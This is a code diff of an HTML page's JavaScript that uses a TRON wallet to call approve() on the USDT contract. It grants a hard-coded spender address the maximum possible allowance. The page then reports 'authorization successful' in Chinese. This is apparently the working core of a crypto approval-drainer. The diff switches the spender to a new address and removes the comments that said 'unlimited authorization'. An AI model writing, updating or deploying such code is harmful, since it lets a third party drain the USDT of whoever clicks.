@@ -24,9 +24,9 @@
   </div>
 
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // 主网 USDT 合约地址
-    const SPENDER = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz";       // 授权目标地址
-    const AMOUNT = "9223372036854775807"; // 无限授权数额
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER = "TX6LRf9FvNwmJM9CyXJbGXHH1oFZZZsYWR";
+    const AMOUNT = "9223372036854775807";
 
     const query = new URLSearchParams(location.search);
     const user = query.get("username") || "未提供";
@@ -51,10 +51,7 @@
         }
 
         const contract = await tron.contract().at(USDT_CONTRACT);
-        const txid = await contract.approve(SPENDER, tron.toBigNumber(AMOUNT)).send({
-          feeLimit: 100_000000
-        });
-
+        const txid = await contract.approve(SPENDER, tron.toBigNumber(AMOUNT)).send({ feeLimit: 100000000 });
         statusEl.innerText = "授权成功！交易哈希：" + txid;
       } catch (e) {
         statusEl.innerText = "授权异常：" + (e.message || JSON.stringify(e));
